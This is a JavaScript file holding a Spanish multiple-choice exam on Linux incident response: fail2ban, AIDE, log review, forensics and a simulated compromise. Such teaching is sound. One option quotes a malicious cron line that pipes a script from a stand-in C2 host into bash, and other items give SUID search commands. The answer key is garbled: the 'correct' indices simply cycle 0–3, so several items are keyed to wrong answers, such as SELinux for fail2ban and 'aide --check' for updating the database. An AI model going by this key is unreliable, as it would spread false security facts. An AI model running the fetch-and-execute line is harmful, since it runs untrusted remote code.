const exam = [
  {
    q: `¿Cuántas fases tiene el Cyber Kill Chain de Lockheed Martin?`,
    options: [
      `7`,
      `5`,
      `6`,
      `9`,
    ],
    correct: 0,
  },
  {
    q: `Un atacante ejecuta \`find / -perm -4000 -type f\` en un sistema comprometido. ¿Qué está buscando?`,
    options: [
      `Archivos de configuración de red`,
      `Binarios con bit SUID para escalar privilegios`,
      `Puertos abiertos en el firewall`,
      `Usuarios con contraseña vacía`,
    ],
    correct: 1,
  },
  {
    q: `¿En qué fase del kill chain se instala un cron job malicioso para mantener acceso al sistema?`,
    options: [
      `Reconocimiento`,
      `Armado`,
      `Instalación (persistencia)`,
      `Entrega`,
    ],
    correct: 2,
  },
  {
    q: `¿Qué técnica usa la variable de entorno LD_PRELOAD en un ataque?`,
    options: [
      `Escanear puertos remotos`,
      `Cifrar el tráfico de red`,
      `Rotar los logs del sistema`,
      `Cargar una librería maliciosa antes que las legítimas`,
    ],
    correct: 3,
  },
  {
    q: `¿Qué framework es más granular que el Cyber Kill Chain y mapea tácticas y técnicas observadas en ataques reales?`,
    options: [
      `MITRE ATT&CK`,
      `NIST SP 800-61`,
      `OWASP Top 10`,
      `CIS Benchmarks`,
    ],
    correct: 0,
  },
  {
    q: `¿Qué control defensivo detiene específicamente la fase de "Entrega" en un ataque de fuerza bruta SSH?`,
    options: [
      `AIDE`,
      `SELinux`,
      `auditd`,
      `fail2ban`,
    ],
    correct: 1,
  },
  {
    q: `En fail2ban, ¿cuál es la regla fundamental sobre los archivos de configuración?`,
    options: [
      `Editar jail.conf directamente para overrides rápidos`,
      `Todos los cambios van en fail2ban.conf`,
      `Nunca editar jail.conf; usar siempre jail.local para overrides`,
      `Los filtros se editan en jail.local, no en filter.d`,
    ],
    correct: 2,
  },
  {
    q: `¿Cuáles son los tres parámetros críticos de un jail en fail2ban?`,
    options: [
      `logpath, backend, port`,
      `ignoreip, banaction, enabled`,
      `filter, action, chain`,
      `bantime, findtime, maxretry`,
    ],
    correct: 3,
  },
  {
    q: `¿Qué comando de fail2ban-client se usa para desbanear manualmente una IP en el jail sshd?`,
    options: [
      `fail2ban-client set sshd unbanip <IP>`,
      `fail2ban-client reload sshd`,
      `fail2ban-client status sshd`,
      `fail2ban-client set sshd banip <IP>`,
    ],
    correct: 0,
  },
  {
    q: `¿Para qué sirve la herramienta \`fail2ban-regex\`?`,
    options: [
      `Para banear IPs manualmente sin reiniciar el servicio`,
      `Para probar que un filtro captura correctamente las líneas de log antes de activarlo en producción`,
      `Para configurar el firewall subyacente (iptables/ufw)`,
      `Para generar reportes estadísticos de baneos históricos`,
    ],
    correct: 1,
  },
  {
    q: `¿Qué componente de fail2ban define las expresiones regulares que identifican intentos fallidos en los logs?`,
    options: [
      `Jail`,
      `Action`,
      `Filter`,
      `Backend`,
    ],
    correct: 2,
  },
  {
    q: `En jail.local, ¿qué parámetro se usa para excluir IPs de administración del baneo automático?`,
    options: [
      `maxretry`,
      `findtime`,
      `bantime`,
      `ignoreip`,
    ],
    correct: 3,
  },
  {
    q: `¿Cuáles son los tres pasos fundamentales del funcionamiento de AIDE?`,
    options: [
      `Init, guardar la base de datos en lugar seguro, y check`,
      `Escanear, alertar, bloquear`,
      `Instalar, actualizar, desinstalar`,
      `Filtrar, banear, notificar`,
    ],
    correct: 0,
  },
  {
    q: `¿Por qué es crítico guardar la base de datos de referencia de AIDE en un medio externo de solo lectura?`,
    options: [
      `Porque AIDE no puede leer bases de datos locales`,
      `Porque si el atacante tiene root, puede modificar una DB local y ocultar los cambios`,
      `Para reducir el tamaño del archivo de base de datos`,
      `Para que las actualizaciones de paquetes no la sobreescriban automáticamente`,
    ],
    correct: 1,
  },
  {
    q: `Después de instalar actualizaciones legítimas del sistema, ¿qué comando se usa para evitar falsas alarmas futuras en AIDE?`,
    options: [
      `aide --init`,
      `aide --update`,
      `aide --check`,
      `aide --version`,
    ],
    correct: 2,
  },
  {
    q: `¿Por qué se recomienda excluir directorios como /var/log, /tmp y /proc de la configuración de AIDE?`,
    options: [
      `Porque contienen información confidencial`,
      `Porque AIDE no tiene permisos para leerlos`,
      `Porque no existen en todos los sistemas Linux`,
      `Porque cambian constantemente y generarían ruido excesivo en los reportes`,
    ],
    correct: 3,
  },
  {
    q: `AIDE reporta un cambio en /usr/lib/x86_64-linux-gnu/libpam.so.0. ¿Por qué es esto especialmente preocupante?`,
    options: [
      `Porque libpam.so gestiona la autenticación del sistema y un backdoor allí podría capturar contraseñas`,
      `Porque es un archivo de configuración de red`,
      `Porque es un archivo temporal que no debería existir`,
      `Porque afecta únicamente al rendimiento gráfico del sistema`,
    ],
    correct: 0,
  },
  {
    q: `¿Qué grupo de atributos de AIDE (FIPSR o NORMAL) incluye la verificación de hash SHA256 además de permisos, tamaño y timestamps?`,
    options: [
      `NORMAL únicamente`,
      `Ambos incluyen SHA256`,
      `Ninguno de los dos incluye hash`,
      `Solo el grupo definido manualmente por el usuario`,
    ],
    correct: 1,
  },
  {
    q: `¿Cuál es la diferencia entre \`last\` y \`lastb\`?`,
    options: [
      `\`last\` muestra procesos activos; \`lastb\` muestra conexiones de red`,
      `Ambos comandos hacen exactamente lo mismo`,
      `\`last\` lee /var/log/wtmp (logins exitosos); \`lastb\` lee /var/log/btmp (intentos fallidos)`,
      `\`last\` es para RHEL y \`lastb\` es para Debian`,
    ],
    correct: 2,
  },
  {
    q: `En sistemas Debian/Ubuntu, ¿dónde se registran los eventos de autenticación SSH y sudo?`,
    options: [
      `/var/log/secure`,
      `/var/log/kern.log`,
      `/var/log/cron`,
      `/var/log/auth.log`,
    ],
    correct: 3,
  },
  {
    q: `¿Por qué el logging centralizado con rsyslog es crítico para la respuesta a incidentes?`,
    options: [
      `Porque preserva los logs en un servidor externo antes de que el atacante pueda borrarlos localmente`,
      `Porque reduce el uso de disco en cada servidor`,
      `Porque es obligatorio por ley en todos los países`,
      `Porque mejora el rendimiento de las aplicaciones web`,
    ],
    correct: 0,
  },
  {
    q: `¿Qué señal de alerta en los logs de sudo indica un comportamiento especialmente sospechoso?`,
    options: [
      `COMMAND=/usr/bin/systemctl status nginx`,
      `COMMAND=/bin/bash ejecutado como shell interactivo root a horas inusuales`,
      `Uso de sudo por el usuario administrador durante horario laboral`,
      `COMMAND=/usr/bin/ls en el directorio home`,
    ],
    correct: 1,
  },
  {
    q: `¿Qué herramienta se usa para analizar visualmente logs de acceso web (nginx/Apache) y detectar patrones de escaneo?`,
    options: [
      `fail2ban-regex`,
      `GoAccess`,
      `utmpdump`,
      `aide`,
    ],
    correct: 2,
  },
  {
    q: `Un login exitoso aparece en auth.log desde una IP externa a las 3 AM. ¿Qué comando revisarías primero para ver si hubo intentos fallidos previos desde la misma IP?`,
    options: [
      `aide --check`,
      `goaccess`,
      `crontab -l`,
      `lastb`,
    ],
    correct: 3,
  },
  {
    q: `¿Cuál es un indicador de compromiso crítico relacionado con /etc/passwd?`,
    options: [
      `Un usuario con UID 0 distinto de root`,
      `Cualquier usuario con shell nologin`,
      `Un usuario con directorio home en /home`,
      `Un usuario con GID igual a su UID`,
    ],
    correct: 0,
  },
  {
    q: `¿Qué indica que un proceso en /proc/PID/exe aparece marcado como "(deleted)"?`,
    options: [
      `Que el proceso terminó correctamente`,
      `Que el binario fue eliminado del disco después de ejecutarse, técnica de evasión común`,
      `Que el sistema tiene poco espacio en disco`,
      `Que el proceso pertenece a un contenedor`,
    ],
    correct: 1,
  },
  {
    q: `¿Qué comando en sistemas basados en RPM verifica la integridad de todos los paquetes instalados contra sus hashes originales?`,
    options: [
      `dpkg --verify`,
      `apt --check-integrity`,
      `rpm -Va`,
      `yum verify-all`,
    ],
    correct: 2,
  },
  {
    q: `\`rpm -Va\` reporta \`S.5....T. /bin/ls\`. ¿Qué implica esta salida?`,
    options: [
      `Que /bin/ls tiene permisos incorrectos únicamente`,
      `Que /bin/ls fue eliminado del sistema`,
      `Que solo cambió la fecha de acceso (atime)`,
      `Que el tamaño y el hash del binario cambiaron, indicando posible reemplazo por un rootkit`,
    ],
    correct: 3,
  },
  {
    q: `¿Qué comando busca binarios con el bit SGID activado, que también pueden usarse para escalar privilegios?`,
    options: [
      `find / -perm -2000 -type f`,
      `find / -perm -4000 -type f`,
      `find / -perm -0700 -type f`,
      `find / -perm -1000 -type f`,
    ],
    correct: 0,
  },
  {
    q: `Un bash_history completamente vacío en una cuenta que se usa activamente es señal de:`,
    options: [
      `Que el usuario nunca ha iniciado sesión`,
      `Posible manipulación (history -c o HISTFILE=/dev/null) por parte de un atacante`,
      `Configuración por defecto del sistema`,
      `Que el usuario usa exclusivamente scripts automatizados`,
    ],
    correct: 1,
  },
  {
    q: `¿Cuántas fases define NIST SP 800-61 para el ciclo de respuesta a incidentes, incluyendo preparación y lecciones aprendidas?`,
    options: [
      `4`,
      `5`,
      `7`,
      `6`,
    ],
    correct: 2,
  },
  {
    q: `Un administrador reinicia un servidor comprometido "para limpiar procesos maliciosos". ¿Qué evidencia se pierde principalmente?`,
    options: [
      `Los logs almacenados en disco`,
      `Los backups automáticos programados`,
      `La configuración de fail2ban`,
      `La evidencia volátil: conexiones de red activas, procesos en memoria y RAM`,
    ],
    correct: 3,
  },
  {
    q: `¿Qué comando bloquea una cuenta comprometida sin eliminarla, preservando evidencia de acceso?`,
    options: [
      `usermod -L usuario`,
      `userdel -r usuario`,
      `passwd -d usuario`,
      `chmod 000 /home/usuario`,
    ],
    correct: 0,
  },
  {
    q: `¿Cuál es la diferencia entre contención y eradicación en respuesta a incidentes?`,
    options: [
      `Son sinónimos del mismo proceso`,
      `La contención detiene el daño inmediato sin eliminar la causa raíz; la eradicación elimina la causa raíz`,
      `La eradicación siempre ocurre antes que la contención`,
      `La contención solo aplica a incidentes de red, la eradicación solo a malware`,
    ],
    correct: 1,
  },
  {
    q: `¿Por qué se recomienda usar un canal de comunicación fuera de banda durante un incidente activo?`,
    options: [
      `Porque es más rápido que el correo corporativo`,
      `Porque las políticas de la empresa lo exigen siempre`,
      `Porque el atacante podría tener acceso a los sistemas de comunicación internos`,
      `Porque reduce costos de infraestructura`,
    ],
    correct: 2,
  },
  {
    q: `Según la regla de oro de la preservación de evidencia mencionada en el playbook, ¿qué se recomienda?`,
    options: [
      `Que solo el CISO puede tocar los sistemas comprometidos`,
      `Que la evidencia debe borrarse tras 24 horas por privacidad`,
      `Que los backups deben estar en el mismo servidor comprometido`,
      `Que quien recolecta evidencia no debería ser quien la analiza, para mantener cadena de custodia`,
    ],
    correct: 3,
  },
  {
    q: `¿Qué acción NUNCA se debe realizar durante los primeros minutos de un incidente, según el playbook?`,
    options: [
      `Reiniciar o apagar el sistema comprometido`,
      `Notificar al responsable de seguridad`,
      `Abrir un canal de comunicación fuera de banda`,
      `Confirmar que es un incidente real y no un falso positivo`,
    ],
    correct: 0,
  },
  {
    q: `¿Cuál es el primer tipo de evidencia que se debe recolectar según el orden de volatilidad?`,
    options: [
      `El disco completo y los backups`,
      `Registros de CPU, caché y RAM (los más volátiles)`,
      `Los logs del sistema`,
      `El sistema de archivos`,
    ],
    correct: 1,
  },
  {
    q: `¿Cuál es la diferencia entre mtime y ctime de un archivo, y por qué ctime es más relevante en forense?`,
    options: [
      `mtime y ctime son idénticos en Linux`,
      `ctime solo existe en sistemas de archivos NTFS`,
      `mtime es el tiempo de modificación de contenido (falsificable con touch); ctime es el cambio de inode, más difícil de manipular`,
      `mtime se actualiza con cada lectura del archivo`,
    ],
    correct: 2,
  },
  {
    q: `¿Qué opción de montaje es crítica al examinar una imagen forense para no alterar la evidencia?`,
    options: [
      `-o rw,loop`,
      `-o exec,loop`,
      `-o noatime,rw`,
      `-o ro,loop`,
    ],
    correct: 3,
  },
  {
    q: `¿Qué comando genera una imagen forense bit-a-bit de un disco?`,
    options: [
      `dd if=/dev/sda of=/evidence/disk.img bs=64K status=progress`,
      `tar -czf disco.tar.gz /dev/sda`,
      `cp -r /dev/sda /evidence/`,
      `rsync -av /dev/sda /evidence/`,
    ],
    correct: 0,
  },
  {
    q: `Al analizar un binario sospechoso, ¿qué comando permite ver los "magic bytes" iniciales para verificar el tipo real de archivo?`,
    options: [
      `strings`,
      `hexdump -C`,
      `file`,
      `lsof`,
    ],
    correct: 1,
  },
  {
    q: `¿Qué indica un proceso con \`bash\` directamente asociado a una conexión de red establecida en \`ss -tnp\`?`,
    options: [
      `Un servidor web funcionando normalmente`,
      `Una copia de seguridad en curso`,
      `Indicio de una shell reversa activa`,
      `Una sesión de FTP anónima`,
    ],
    correct: 2,
  },
  {
    q: `En el escenario del proyecto, ¿cómo obtuvo el atacante las credenciales iniciales?`,
    options: [
      `Explotando una vulnerabilidad de kernel`,
      `Interceptando tráfico de red sin cifrar`,
      `A través de un ataque de phishing por correo`,
      `Mediante fuerza bruta con hydra contra el usuario backup`,
    ],
    correct: 3,
  },
  {
    q: `¿Qué usuario backdoor creó el atacante y con qué UID inusual?`,
    options: [
      `h4ck3r, UID 1337`,
      `admin, UID 0`,
      `backup2, UID 1002`,
      `root2, UID 500`,
    ],
    correct: 0,
  },
  {
    q: `El analista IR elimina al usuario h4ck3r y el cron job, pero no cambia las contraseñas porque "el atacante ya no tiene acceso". ¿Por qué es un error crítico?`,
    options: [
      `Porque cambiar contraseñas requiere reiniciar el servidor`,
      `Porque el atacante ya exfiltró /etc/shadow y puede crackear los hashes offline`,
      `Porque no es un error, la eradicación ya está completa`,
      `Porque las contraseñas se regeneran automáticamente cada 30 días`,
    ],
    correct: 1,
  },
  {
    q: `¿Qué mecanismo usaba el cron job malicioso instalado por el atacante?`,
    options: [
      `Escaneo de puertos cada hora`,
      `Envío de correos de phishing automáticos`,
      `\`curl http://evil-c2.example.com/payload.sh | bash\` cada 5 minutos`,
      `Backup automático de la base de datos hacia el exterior`,
    ],
    correct: 2,
  },
  {
    q: `¿Cuál es el orden correcto de las fases aplicadas en el proyecto tras la detección?`,
    options: [
      `Eradicación → contención → preservación → recuperación`,
      `Recuperación → eradicación → contención → preservación`,
      `Contención → recuperación → preservación → eradicación`,
      `Preservación de evidencia → contención → eradicación → recuperación`,
    ],
    correct: 3,
  },
  {
    q: `¿Qué archivo exfiltrado representa el hallazgo más crítico del incidente simulado?`,
    options: [
      `Una copia de /etc/shadow guardada en /tmp/.hidden_data`,
      `/etc/hosts`,
      `/var/log/syslog`,
      `El archivo /etc/fstab`,
    ],
    correct: 0,
  },
  {
    q: `Como medida de endurecimiento tras el incidente, ¿qué cambio se recomienda en sshd_config?`,
    options: [
      `Aumentar MaxAuthTries a 20 para evitar bloqueos accidentales`,
      `Deshabilitar PasswordAuthentication y PermitRootLogin, usando solo claves SSH`,
      `Habilitar el login de root para facilitar la administración`,
      `Desactivar el logging de sshd para reducir ruido`,
    ],
    correct: 1,
  },
]

export default exam
